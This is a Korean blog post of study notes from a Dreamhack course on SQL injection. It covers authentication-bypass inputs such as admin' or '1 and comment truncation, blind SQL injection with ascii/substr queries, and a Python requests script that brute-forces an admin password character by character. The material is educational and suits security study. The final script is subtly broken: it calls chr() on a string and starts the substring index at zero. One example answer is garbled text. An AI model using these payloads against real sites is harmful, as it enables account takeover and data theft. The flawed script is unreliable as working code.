---
title: Dreamhack SQL Injection
date: 2022-02-21 14:23:00
tags: Dreamhack
categories: Dreamhack
---

## Summary
![SQL](https://kr.object.ncloudstorage.com/dreamhack-content/page/61508700d5eeea3c815cbc67e1a005e8139875b9e73f009ae0baceb3379f3d64.png)
![SQL](https://kr.object.ncloudstorage.com/dreamhack-content/page/5b48f0a9fb65b75c81f8df8f4cdd0c92f4e7817176b882aab248c98867e39226.png)

- SQL Injection : SQL 쿼리에 이용자의 입력 값을 삽입해 이용자가 원하는 쿼리를 실행할 수 있는 취약점
- Blind SQL Injection : 데이터베이스 조회 후 결과를 직접적으로 확인할 수 없는 경우 사용할 수 있는 SQL Injection 공격 기법

지난 코스에서 DBMS 에 대해서 알아보았습니다
DBMS 에서 관리하는 데이터베이스에는 회원 계정 , 비밀글과 같이 민감한 정보가 포함되어 있을 수 있습니다

공격자는 데이터베이스 파일 탈취 , SQL Injection 공격 등으로 해당 정보를 확보하고 악용하여 금전적인 이익을 얻을 수 있습니다

따라서 임의 정보 소유자 이외의 이용자에게 해당 정보가 노출되지 않도록 해야합니다
이번 코스에서는 DBMS 에서 사용하는 쿼리를 임의로 조작해 데이터베이스의 정보를 획득하는 SQL Injection 기법에 대해 배웁니다

우리는 SQL Injection 을 알아보기 전에 인젝션이 무엇인지 알고 있어야 합니다
인젝션은 주입이라는 의미를 가진 영단어로 , 인젝션 공격은 이용자의 입력값이 애플리케이션의 처리 과정에서 구조나 문법적인 데이터로 해석되어 발생하는 취약점을 의미합니다

Figure1 은 드림이가 공장에 생산을 요청 하는 그림으로 , 위의 그림에서 드림이가 부품 생성 중에 임의의 요청을 보내 제품의 색깔을 지정합니다
그러나 아래 그림에서 드림이가 올바르지 않은 요청을 보내 공장 운영자가 의도하지 않은 행위를 일으키는 것을 확인할 수 있습니다

이와 같이 이용자가 악의적인 입력값을 주입해 의도하지 않은 행위를 일으키는 것을 인젝션 이라고 합니다

SQL Injection 을 그림과 함께 알아보도록 하겠습니다

그림에서 요청자는 드림이이며 , 요청을 받는 기계는 DBMS 로 빗댈 수 있습니다
드림이가 로그인을 하기 위해 아이디가 Dreamhack 이고 , 비밀번호가 Password 인 계정으로 로그인하겠습니다 요청을 보내면 DBMS 는 이에 해당하는 정보를 찾고 로그인 성공 여부를 결정합니다

그러나 만약 드림이가 아이디가 admin 인 계정으로 로그인하겠습니다 요청을 보내면 DBMS 는 비밀번호 일치 여부를 검사하지 않고 , 아이디가 admin 인 계정을 조회한 후 이용자에게 로그인 결과를 반환합니다

이와 같이 DBMS 에서 사용하는 질의 구문인 SQL 을 삽입하는 공격을 SQL Injection 이라고 합니다

## SQL Injection
SQL 은 DBMS 에 데이터를 질의하는 언어입니다
웹 서비스는 이용자의 입력을 SQL 구문에 포함해 요청하는 경우가 있습니다

예를 들면 로그인 시에 ID / PW 를 포함하거나 , 게시글의 제목과 내용을 SQL 구문에 포함합니다

Figure2 는 로그인 할 때 애플리케이션이 DBMS 에 질의하는 예시 쿼리입니다

쿼리문을 살펴보면 , 이용자가 입력한 Dreamhack 과 Password 문자열을 SQL 구문에 포함하는 것을 확인할 수 있습니다
이렇게 이용자가 SQL 구문에 임의 문자열을 삽입하는 행위를 SQL Injection 이라고 합니다

SQL Injection 이 발생하면 조작된 쿼리로 인증을 우회하거나 , 데이터베이스의 정보를 유출할 수 있습니다

Figure3 은 SQL Injection 으로 조작한 쿼리문의 예시입니다
쿼리를 살펴보면 , user_pw 조건문이 사라진 것을 확인할 수 있습니다

조작한 쿼리를 통해 질의하면 DBMS 는 ID 가 admin 인 계정의 비밀번호를 비교하지 않고 해당 계정의 정보를 반환하기 때문에 이용자는 admin 계정으로 로그인할 수 있습니다

Figure2 로그인 기능을 위한 쿼리

```SQL
/*
아래 쿼리 질의는 다음과 같은 의미를 가지고 있습니다.
- SELECT: 조회 명령어
- *: 테이블의 모든 컬럼 조회
- FROM accounts: accounts 테이블 에서 데이터를 조회할 것이라고 지정
- WHERE user_id='dreamhack' and user_pw='password': user_id 컬럼이 dreamhack이고, user_pw 컬럼이 password인 데이터로 범위 지정
즉, 이를 해석하면 DBMS에 저장된 accounts 테이블에서 이용자의 아이디가 dreamhack이고, 비밀번호가 password인 데이터를 조회
*/
SELECT * FROM accounts WHERE user_id='dreamhack' and user_pw='password'
```

Fiugre3 SQL Injection 으로 조작한 쿼리

```SQL
/*
아래 쿼리 질의는 다음과 같은 의미를 가지고 있습니다.
- SELECT: 조회 명령어
- *: 테이블의 모든 컬럼 조회
- FROM accounts: accounts 테이블 에서 데이터를 조회할 것이라고 지정
- WHERE user_id='admin': user_id 컬럼이 admin인 데이터로 범위 지정
즉, 이를 해석하면 DBMS에 저장된 accounts 테이블에서 이용자의 아이디가 admin인 데이터를 조회
*/
SELECT * FROM accounts WHERE user_id='admin'
```

## Simple SQL Injection
우리는 SQL Injection 을 인증 우회에 사용할 수 있는 것을 배웠습니다
그렇다면 SQL Injection 이 실제로 어떻게 발생하는지 오른쪽의 모듈을 통해 실습해 보겠습니다

실습 모듈을 살펴보면 , 아이디와 비밀번호를 입력받고 DBMS 에 조회하기 위한 쿼리를 생성 및 실행합니다

실습 모듈에서 사용하는 user_table 은 다음과 같이 구현되어 있습니다

- uid : guest admin
- upw : guest **********

실습 모듈의 목표는 쿼리 질의를 통해 admin 결과를 반환하는 것입니다

SQL Injection 공격에서 제일 중요한 것은 이용자의 입력값이 SQL 구문으로 해석되도록 해야합니다
실습 모듈에서 사용하는 쿼리문의 경우 이용자의 입력값을 문자열로 나타내기 위해 ' 문자를 사용하는 것을 볼 수 있습니다

여기서 이용자의 입력값이 SQL 구문으로 해석되도록 하기 위해서는 ' 문자를 입력하는 방법이 있습니다

uid 에 admin' or '1 을 입력하고 비밀번호를 입력하지 않았을 때 생성되는 쿼리문은 다음과 같습니다

```SQL
SELECT * FROM user_table WHERE uid='admin' or '1' and upw='';
```

쿼리문을 살펴보면 두 개의 조건으로 나눠볼 수 있습니다
첫번째 조건은 uid 가 admin 인 데이터 , 두 번째 조건은 이전의 식이 참이고 , upw 가 없는 경우입니다

첫번째 조건은 admin 의 결과를 반환하고 두 번째 조건은 아무런 결과도 반환하지 않습니다
다시 말해 , uid 가 admin 인 데이터를 반환하기 때문에 관리자 계정으로 로그인할 수 있습니다

이 외에도 , 주석 -- , # , /**/ 을 사용하는 등 다양한 방법으로 SQL Injection 을 시도할 수 있습니다

```SQL
SELECT * FROM user_table WHERE uid='admin'-- ' and upw='';
```

## Blind SQL Injection
![SQL](https://kr.object.ncloudstorage.com/dreamhack-content/page/99efa87ecf284db56b8217333c32b68a1505313a1acf78fb390bd0473aa5f4ad.png)

앞서 SQL Injection 을 통해 의도하지 않은 결과를 반환해 인증을 우회하는 것을 실습했습니다
해당 공격은 인증 우회 이외에도 데이터베이스의 데이터를 알아낼 수 있습니다

이때 사용할 수 있는 공격 기법으로는 Blind SQL Injection 이 있습니다
해당 공격 기법은 스무고개 게임과 유사한 방식으로 데이터를 알아낼 수 있습니다

스무고개는 질문자와 답변자가 있고 , 질문자가 답변을 하면 답변자가 예 / 아니요로 대답을 해 질문자가 답을 유추하는 게임입니다

오른쪽 그림을 보면 답변자가 7 이라는 숫자를 칠판에 적어둔 뒤 , 질문을 받습니다
질문자는 해당 숫자가 6 인지 묻습니다

답변자는 6 보다 큰 숫자라고 대답을 합니다
이제 질문자는 해당 숫자가 8 인지 묻자 , 답변자는 8 보다 작은 숫자라고 대답을 합니다

이때 질문자는 정답이 7 이라는 것을 알 수 있습니다
공격자는 이러한 방법으로 데이터베이스의 내용을 알아낼 수 있습니다

- Question 1. dreamhack 계정의 비밀번호 첫 번째 글자는 x 인가요 ?
Answer. 아닙니다
- Question 2. dreamhack 계정의 비밀번호 첫 번째 글자는 p 인가요 ?
Answer. akwtmqslek
- Question 3. dreamhack 계정의 비밀번호 두 번째 글자는 y 인가요 ?
Answer. 아닙니다
- Question 4. dreamhack 계정의 비밀번호 두번째 글자는 a 인가요 ?
Answer. 맞씁니다

위와 같은 형태로 DBMS 가 답변 가능한 형태로 질문하면서 dreamhack 계정의 비밀번호인 password 를 알아낼 수 있습니다

이처럼 질의 결과를 이용자가 화면에서 직접 확인하지 못할 때 참 / 거짓 반환 결과로 데이터를 획득하는 공격 기법을 Blind SQL Injection 기법이라고 합니다

Figure4 는 Blind SQL Injection 공격 시에 사용할 수 있는 쿼리입니다
세 개의 조건이 있는 것을 확인할 수 있습니다 조건을 살펴보기 전에 ascii 와 substr 함수에 대해서 알아보겠습니다

### ascii
전달된 문자를 아스키 형태로 반환하는 함수입니다
예를 들어 ascii('a') 를 실행하면 a 문자의 아스키 값인 97 을 반환합니다

### substr
해당 함수에 전달되는 인자와 예시는 다음과 같습니다
해당 함수는 문자열에서 지정한 위치부터 길이까지의 값을 가져옵니다

```SQL
substr(string, position, length)
substr('ABCD', 1, 1) = 'A'
substr('ABCD', 2, 2) = 'BC'
```

공격 쿼리문의 두 번째 조건을 살펴보면 upw 의 첫 번째 값을 아스키 형태로 변환한 값이 114 또는 115 인지 질의합니다

질의 결과는 로그인 성공 여부로 참 / 거짓을 판단할 수 있습니다
만약 로그인이 실패할 경우 첫 번째 문자가 r 이 아님을 의미합니다
이처럼 쿼리문의 반환 결과를 통해 admin 계정의 비밀번호를 획득할 수 있습니다

Figure4 Blind SQL Injection 공격 쿼리

```SQL
# 첫 번째 글자 구하기 (아스키 114 = 'r', 115 = 's'')
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=114-- ' and upw=''; # False
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=115-- ' and upw=''; # True
# 두 번째 글자 구하기 (아스키 115 = 's', 116 = 't')
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,2,1))=115-- ' and upw=''; # False
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,2,1))=116-- ' and upw=''; # True
```

## Blind SQL Injection 공격 스크립트
Blind SQL Injection 은 한 바이트씩 비교하여 공격하는 방식이기 때문에 다른 공격에 비해 많은 시간을 들여야합니다

이러한 문제를 해결하기 위해서는 공격을 자동화하는 스크립트를 작성하는 방법이 있습니다
공격 스크립트를 작성하기에 앞서 유용한 라이브러리를 알아보겠습니다

파이썬은 HTTP 통신을 위한 다양한 모듈이 존재하는데 대표적으로 requests 모듈이 있습니다

해당 모듈은 다양한 메소드를 사용해 HTTP 요청을 보낼 수 있으며 응답 또한 확인할 수 있습니다

Figure5 는 requests 모듈을 통해 HTTP 의 GET 메소드 통신을 하는 예제 코드입니다
request.get 은 GET 메소드를 사용해 HTTP 요청을 보내는 함수로 , URL 과 Header , Parameter 와 함께 요청을 전송할 수 있습니다

Figure6 은 HTTP 의 POST 메소드 통신을 하는 예제 코드입니다
request.post 는 POST 메소드를 사용해 HTTP 요청을 보내는 함수로 URL 과 Header , Body 와 함께 요청을 전송할 수 있습니다

Figure5 requests 모듈 GET 예제 코드

```python
import requests

url = 'https://dreamhack.io/'

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'DREAMHACK_REQUEST'
}

params = {
    'test': 1,
}

for i in range(1, 5):
    c = requests.get(url + str(i), headers=headers, params=params)
    print(c.request.url)
    print(c.text)
```

Figure6 requests 모듈 POST 예제 코드

```python
import requests

url = 'https://dreamhack.io/'

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'DREAMHACK_REQUEST'

}
data = {
    'test': 1,
}

for i in range(1, 5):
    c = requests.post(url + str(i), headers=headers, data=data)
    print(c.text)
```

## Blind SQL Injection 공격 스크립트 작성
앞서 다룬 예제에서 Blind SQL Injection 을 시도한다고 가정합니다
공격하기에 앞서 아스키 범위 중 이용자가 입력할 수 있는 모든 문자의 범위를 지정해야 합니다

예를 들어 비밀번호의 경우 알파벳과 숫자 그리고 특수 문자로 이뤄집니다
이는 아스키 범위로 나타내면 32 부터 126 까지 모든 문자입니다

위를 고려해 작성한 스크립트는 Figure7 과 같습니다
코드를 살펴보면 비밀번호에 포함될 수 있는 문자를 string 모듈을 사용해 생성하고 한 바이트씩 모든 문자를 비교하는 반복문을 작성합니다

반복문 실행 중에 반환 결과가 참일 경우에 페이지에 표시되는 Login success 문자열을 찾고 해당 결과를 반환한 문자를 passowrd 변수에 저장합니다

반복문을 마치면 admin 계정의 비밀번호를 알아낼 수 있습니다

Figure7 Blind SQL Injection 공격 스크립트

```python
#!/usr/bin/python3
import requests
import string

url = 'http://example.com/login' # example URL
params = {
    'uid': '',
    'upw': ''
}

tc = string.ascii_letters + string.digits + string.punctuation # abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~
query = '''
admin' and ascii(substr(upw,{idx},1))={val}--
'''
password = ''

for idx in range(0, 20):
    for ch in tc:
        params['uid'] = query.format(idx=idx, val=ord(ch)).strip("\n")
        c = requests.get(url, params=params)
        print(c.request.url)
        if c.text.find("Login success") != -1:
            password += chr(ch)
            break
print(f"Password is {password}")
```

* * * 

## Reference
Reference : https://dreamhack.io